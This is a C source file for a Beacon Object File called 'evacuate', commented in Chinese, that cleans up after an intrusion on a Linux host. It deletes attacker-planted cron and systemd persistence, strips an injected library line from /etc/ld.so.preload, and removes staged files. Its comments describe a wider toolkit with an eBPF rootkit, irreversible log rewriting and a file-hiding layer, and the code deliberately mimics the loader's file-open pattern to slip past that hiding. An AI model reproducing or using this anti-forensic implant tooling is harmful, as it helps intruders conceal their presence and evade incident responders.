/// evacuate.c — BOF: 现场复原 / 撤离（P3/H2）
///
/// Compile: gcc -c -o evacuate.o evacuate.c -include bof_api.h -Os -fPIC
/// Usage:   execute bof evacuate.o <spec>
///
///   spec = ';' 分隔的步骤串，**按给定顺序执行**：
///     cron:<name>         删 /etc/cron.d/<name>
///     systemd:<name>      删 /etc/systemd/system/<name>.{service,timer}
///                         + timers.target.wants/<name>.timer 链接
///     preload:<so_path>   从 /etc/ld.so.preload 移除**以 <so_path> 开头**的整行；
///                         若移除后文件变空 → 整个 unlink（还原到"文件本不存在"）
///     rm:<path>           删单个文件
///
///   例：
///     execute bof evacuate.o "systemd:sys-maintenance;cron:sys-update;preload:/usr/lib/libx.so;rm:/tmp/stage.bin"
///
/// ── 边界：本 BOF **不碰 eBPF rootkit** ──
/// 卸载 rootkit 是 `ebpf_unload.o <pin>` 的职责（H1 已 ✅）。为什么拆开：
///   ① 恢复可见（unpin）必须**最后**做 —— 早一步，落盘物在"已可见、还没删"
///      的窗口里裸露。本命令负责把落盘物删干净，然后由调用方 unpin。
///   ② pin 一旦 unlink，`<pin>_map6` 里的 perf fd 就再也取不回来（ISS-008 的
///      立即 detach 依赖它），所以那条路径必须完整走 ebpf_unload 的固定顺序
///      （先 close 再 unlink），不能拆散。
/// 本命令跑完会打印建议的最后一步。
///
/// ── 边界：日志**不**做恢复 ──
/// 这是**有意**的，不是缺失。P2-E 的等长改写是**不可逆**的（改写串长度等于
/// needle，原文没有留副本），而且任何"把日志恢复成原样"的动作本身都会在
/// audit/journald/wtmp 里留下**新的**痕迹 —— 越"恢复"越显眼。撤离阶段对日志
/// 的唯一正确动作是**停手**。
///
/// ── 为什么用显式 spec 而不是内置清单 ──
/// 与 P2-E 的 cleanlog 同一条原则：**强迫操作员为自己的动作命名**。撤离是
/// 破坏性操作，"自动扫描 + 自动删除"在目标机上没有安全的启发式；写清楚删什么，
/// 回执就是一份可核对的账。
///
/// 幂等：每一步的 ENOENT 都算成功（撤离命令会被重复下发）。

#include "bof_api.h"

#define O_RDONLY   00
#define O_WRONLY   01
#define O_CREAT    0100
#define O_TRUNC    01000

#define EV_MAX_STEPS 32

/// 参数 blob 不保证 NUL 终止 —— 任何交给 path/printf 的字段先拷进本地缓冲。
static int ax_cstr(char *dst, int cap, const char *src, int len) {
    if (!dst || cap <= 0) return 0;
    dst[0] = 0;
    if (!src || len <= 0) return 0;
    if (len > cap - 1) len = cap - 1;
    AxMemcpy(dst, src, len);
    dst[len] = 0;
    return len;
}

static int ax_exists(const char *path) {
    int fd = AxOpenFile(path, O_RDONLY, 0);
    if (fd < 0) return 0;
    AxCloseFile(fd);
    return 1;
}

/// unlink，把"本来就不存在"归为成功（幂等）。
static int ax_del(const char *path, const char *what) {
    int r = AxUnlink(path);
    if (r == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] removed %s: %s\n", what, path);
        return 1;
    }
    if (r == -2 /*ENOENT*/ || !ax_exists(path)) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [=] absent  %s: %s\n", what, path);
        return 0;
    }
    BeaconPrintf(CALLBACK_ERROR, "  [-] FAILED  %s: %s (err=%d)\n", what, path, r);
    return -1;
}

#define EV_O_CLOEXEC 0x80000

/// ★ 读 preload 的**真身**（ISS-054 的连带修复：redact 补上 open(2) 分支之后，
/// 这一步立刻会中招）。
///
/// 不能用 AxReadFileToBuffer：它走 `open(2)` + O_RDONLY（既不先探测、也不带
/// O_CLOEXEC），在 redact（P3-A）眼里和普通工具**逐字节同形** → 读回来的是被
/// 抹平的假 preload（我们自己那一行看不见）→ 本步会"成功地什么都没删"，回执
/// 还照报 removed。
///
/// redact 的豁免判据 =「本进程刚用 access(2) 探测过它」**AND**「这条 open 带
/// O_CLOEXEC」—— 那正是 ld.so 开 preload 的形态。撤离命令是**我们自己的**工具，
/// 走这条通道是**有意**的：它要删的就是那个我们藏起来的行。
///
/// 顺序不能反：探测必须在 open **之前**（redact 在 access 返回时打旗标，在 open
/// 返回时把它一次性消费掉）。
static int ax_read_real(const char *path, char **out, int max) {
    char *buf;
    int fd, total = 0;

    *out = (char *)0;
    AxAccess(path, 4 /* R_OK */);                              /* ① 探测：打旗标 */
    fd = AxOpenFile(path, 0 /* O_RDONLY */ | EV_O_CLOEXEC, 0); /* ② 带 CLOEXEC */
    if (fd < 0) return -1;
    buf = (char *)AxMalloc(max + 1);
    if (!buf) { AxCloseFile(fd); return -1; }
    while (total < max) {
        int n = AxReadFile(fd, buf + total, max - total);
        if (n <= 0) break;
        total += n;
    }
    AxCloseFile(fd);
    buf[total] = 0;
    *out = buf;
    return total;
}

/// 从 /etc/ld.so.preload 移除以 prefix 开头的整行。空文件 → unlink。
static int ax_preload_remove(const char *prefix) {
    const char *path = "/etc/ld.so.preload";
    char *old = (char *)0;
    int old_len = ax_read_real(path, &old, 65536);   /* 真身；见 ax_read_real 头注 */
    if (old_len <= 0) {
        if (old) AxFree(old);
        BeaconPrintf(CALLBACK_OUTPUT, "  [=] absent  preload: %s\n", path);
        return 0;
    }

    int plen = AxStrlen(prefix);
    /* 就地过滤：保留的行从 out 位置重新写出，最后按实际长度截断写回。 */
    char *out = (char *)AxMalloc(old_len + 1);
    if (!out) {
        AxFree(old);
        BeaconPrintf(CALLBACK_ERROR, "  [-] preload: OOM\n");
        return -1;
    }
    int o = 0, removed = 0;
    int i = 0;
    while (i < old_len) {
        int ls = i;                                   /* 行首 */
        while (i < old_len && old[i] != '\n') i++;
        int le = i;                                   /* 行尾（不含 '\n'） */
        int hit = 0;
        /* 前导空白也算行首（preload 文件里常见缩进/空行） */
        int s = ls;
        while (s < le && (old[s] == ' ' || old[s] == '\t')) s++;
        if (plen > 0 && le - s >= plen) {
            if (AxStrncmp(old + s, prefix, plen) == 0) hit = 1;
        }
        if (hit) {
            removed++;
        } else {
            AxMemcpy(out + o, old + ls, le - ls);
            o += le - ls;
            out[o++] = '\n';
        }
        if (i < old_len && old[i] == '\n') i++;
    }

    if (removed == 0) {
        AxFree(old); AxFree(out);
        BeaconPrintf(CALLBACK_OUTPUT, "  [=] no line starting with '%s' in %s\n", prefix, path);
        return 0;
    }

    /* 全被删光 → 还原到"文件本不存在"（陈旧的新建痕迹比保留一个空文件干净：
     * 一个 0 字节的 /etc/ld.so.preload 本身就是"有人来过"的信号）。 */
    if (o == 0) {
        AxFree(old); AxFree(out);
        AxUnlink(path);
        BeaconPrintf(CALLBACK_OUTPUT,
                     "  [+] preload: removed %d entr(y|ies) -> file empty, unlinked %s\n",
                     removed, path);
        return 1;
    }

    int fd = AxOpenFile(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        AxFree(old); AxFree(out);
        BeaconPrintf(CALLBACK_ERROR, "  [-] preload: cannot reopen %s\n", path);
        return -1;
    }
    int w = AxWriteFile(fd, out, o);
    AxCloseFile(fd);
    AxFree(old); AxFree(out);
    if (w != o) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] preload: short write (%d/%d)\n", w, o);
        return -1;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
                 "  [+] preload: removed %d entr(y|ies), %d bytes left in %s\n",
                 removed, o, path);
    return 1;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int spec_len = 0;
    char *spec = BeaconDataExtract(&parser, &spec_len);

    char buf[2048];
    if (ax_cstr(buf, (int)sizeof(buf), spec, spec_len) <= 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] evacuate: missing spec\n"
            "    usage: evacuate.o \"systemd:<name>;cron:<name>;preload:<so>;rm:<path>\"\n");
        return;
    }

    /* 拆步。就地写 NUL —— buf 是我们自己的可写缓冲。 */
    char *steps[EV_MAX_STEPS];
    int nsteps = 0;
    {
        char *p = buf;
        steps[nsteps++] = p;
        while (*p && nsteps < EV_MAX_STEPS) {
            if (*p == ';') { *p = 0; steps[nsteps++] = p + 1; }
            p++;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] evacuate: %d step(s)\n", nsteps);

    int done = 0, failed = 0;
    for (int i = 0; i < nsteps; i++) {
        char *st = steps[i];
        while (*st == ' ' || *st == '\t') st++;
        if (!*st) continue;

        /* 切 "kind:arg" */
        char *arg = st;
        while (*arg && *arg != ':') arg++;
        if (!*arg) {
            BeaconPrintf(CALLBACK_ERROR, "[-] evacuate: step '%s' has no ':' — skipped\n", st);
            failed++;
            continue;
        }
        *arg = 0;
        arg++;
        while (*arg == ' ' || *arg == '\t') arg++;

        if (AxStrcmp(st, "rm") == 0) {
            if (ax_del(arg, "file") > 0) done++;

        } else if (AxStrcmp(st, "cron") == 0) {
            char path[192];
            AxSnprintf(path, sizeof(path), "/etc/cron.d/%s", arg);
            if (ax_del(path, "cron") > 0) done++;

        } else if (AxStrcmp(st, "systemd") == 0) {
            char p1[192], p2[192], p3[224], rel[128];
            AxSnprintf(p1, sizeof(p1), "/etc/systemd/system/%s.service", arg);
            AxSnprintf(p2, sizeof(p2), "/etc/systemd/system/%s.timer",   arg);
            AxSnprintf(p3, sizeof(p3), "/etc/systemd/system/timers.target.wants/%s.timer", arg);
            AxSnprintf(rel, sizeof(rel), "../%s.timer", arg);
            int r1 = ax_del(p1, "systemd svc");
            int r3 = ax_del(p3, "systemd wants");
            int r2 = ax_del(p2, "systemd tmr");
            if (r1 > 0 || r2 > 0 || r3 > 0) done++;
            /* 注意：systemd 已把单元读进内存，删文件不会让它立刻停 —— 但本机制
             * 的目的是"下次开机不再复活"，而开机是从磁盘全量读的。
             * `systemctl stop` 需要 execve，撤离阶段不值得再留一条 execve 事件。 */

        } else if (AxStrcmp(st, "preload") == 0) {
            if (ax_preload_remove(arg) > 0) done++;

        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] evacuate: unknown step kind '%s' — skipped\n", st);
            failed++;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] evacuate: %d step(s) with effect, %d bad step(s)\n"
        "[*] 最后一步（必须最后做，恢复可见）：\n"
        "    execute bof ebpf_unload.o <pin>\n"
        "[*] 日志不做恢复（等长改写不可逆；任何\"恢复\"本身都是新痕迹）—— 此步有意省略。\n",
        done, failed);
}
